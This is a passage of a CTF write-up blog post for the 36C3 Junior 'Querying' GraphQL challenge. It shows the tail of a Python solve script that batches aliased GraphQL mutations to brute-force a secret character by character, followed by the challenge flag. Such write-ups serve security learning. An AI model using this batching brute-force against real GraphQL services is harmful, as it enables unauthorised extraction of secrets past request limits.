    <span class="k">print</span><span class="p">(</span><span class="s">"getting charakter "</span> <span class="o">+</span>  <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
    <span class="k">for</span> <span class="n">letter</span> <span class="ow">in</span> <span class="n">possible</span><span class="p">:</span>
        <span class="n">start_query</span> <span class="o">=</span> <span class="n">start_query</span> <span class="o">+</span> <span class="n">name</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">number</span><span class="p">)</span> <span class="o">+</span> <span class="s">":"</span> <span class="o">+</span> <span class="n">base_check</span> <span class="o">+</span> <span class="n">letter</span> <span class="o">+</span> <span class="s">'")'</span> <span class="o">+</span> <span class="s">","</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
        <span class="n">number</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">number</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
    <span class="n">number</span> <span class="o">=</span> <span class="mi">1</span>
    <span class="n">start_query</span> <span class="o">=</span> <span class="n">start_query</span> <span class="o">+</span> <span class="n">end_query</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s">"query"</span><span class="p">:</span> <span class="n">start_query</span><span class="p">},</span> <span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">)</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">json</span><span class="p">()[</span><span class="s">"data"</span><span class="p">]</span>
    <span class="n">correct</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">items</span><span class="p">(),</span> <span class="n">key</span><span class="o">=</span><span class="n">operator</span><span class="p">.</span><span class="n">itemgetter</span><span class="p">(</span><span class="mi">1</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">right_character</span> <span class="o">=</span> <span class="n">correct</span><span class="p">[</span><span class="mi">4</span><span class="p">:]</span>
    <span class="n">base_check</span> <span class="o">+=</span> <span class="n">possible</span><span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">right_character</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">start_query</span> <span class="o">=</span> <span class="s">"mutation {</span><span class="se">\n</span><span class="s">"</span>
    <span class="k">print</span><span class="p">(</span><span class="n">base_check</span><span class="p">)</span>
</pre></table></code></div></div><p>Flag: junior-Batching_Qu3r1e5_is_FUN1</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/web/'>Web</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/36c3/" class="post-tag no-text-decoration" >36C3</a> <a href="/tags/graphql/" class="post-tag no-text-decoration" >GraphQL</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=36C3 Querying - Marius Kimmina&url=https://mindslave.github.io/posts/36C3_Querying/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=36C3 Querying - Marius Kimmina&u=https://mindslave.github.io/posts/36C3_Querying/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=36C3 Querying - Marius Kimmina&url=https://mindslave.github.io/posts/36C3_Querying/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HackTheBox_Feline/">HackTheBox Feline</a><li><a href="/posts/HackTheBox_Resolute/">HackTheBox Resolute</a><li><a href="/posts/HackTheBox_ServMon/">HackTheBox ServMon</a><li><a href="/posts/mwa_packing/">Malware Analysis - Packing</a><li><a href="/posts/mwa_globeImposter/">Malware Analysis - unpacking GlobeImposter Ransomware</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/36c3/">36C3</a> <a class="post-tag" href="/tags/malware/">Malware</a> <a class="post-tag" href="/tags/packing/">Packing</a> <a class="post-tag" href="/tags/bsd/">BSD</a> <a class="post-tag" href="/tags/cryptography/">Cryptography</a> <a class="post-tag" href="/tags/dll-injection/">dll injection</a> <a class="post-tag" href="/tags/docker/">docker</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/36C3_Maybe/"><div class="card-body"> <span class="timeago small" > Jan 25, 2020 <i class="unloaded">2020-01-25T07:10:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>36C3 Maybe</h3><div class="text-muted small"><p> 0x0. Introduction This Challenge was part of the 36C3 Junior CTF. It was a reverse engeneering challenge with a difficulty rating of medium. You were only given a binary. 0x1. Something is weird ...</p></div></div></a></div><div class="card"> <a href="/posts/HackTheBox-Traverxec/"><div class="card-body"> <span class="timeago small" > Apr 11, 2020 <i class="unloaded">2020-04-11T08:10:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox Traverxec</h3><div class="text-muted small"><p> 0x0 Introduction Yet another HTB box and again one of the easier ones. This time we had to exploit a vulnerable nostromo webserver version for command execution and then escalate privileges from th...</p></div></div></a></div><div class="card"> <a href="/posts/HackTheBox-OpenAdmin/"><div class="card-body"> <span class="timeago small" > May 2, 2020 <i class="unloaded">2020-05-02T08:10:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox OpenAdmin</h3><div class="text-muted small"><p> 0x0 Introduction The first HackTheBox Maschine I ever owned, featuring OpenNetAmin and typical admin mistakes 0x1 getting a Foothold Like most people probably do I started of the box with an nma...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Pwnablekr_fd/" class="btn btn-outline-primary" prompt="Older"><p>Pwnable.kr fd</p></a> <a href="/posts/36C3_Maybe/" class="btn btn-outline-primary" prompt="Newer"><p>36C3 Maybe</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/Mindslave">Marius Kimmina</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/36c3/">36C3</a> <a class="post-tag" href="/tags/malware/">Malware</a> <a class="post-tag" href="/tags/packing/">Packing</a> <a class="post-tag" href="/tags/bsd/">BSD</a> <a class="post-tag" href="/tags/cryptography/">Cryptography</a> <a class="post-tag" href="/tags/dll-injection/">dll injection</a> <a class="post-tag" href="/tags/docker/">docker</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://mindslave.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
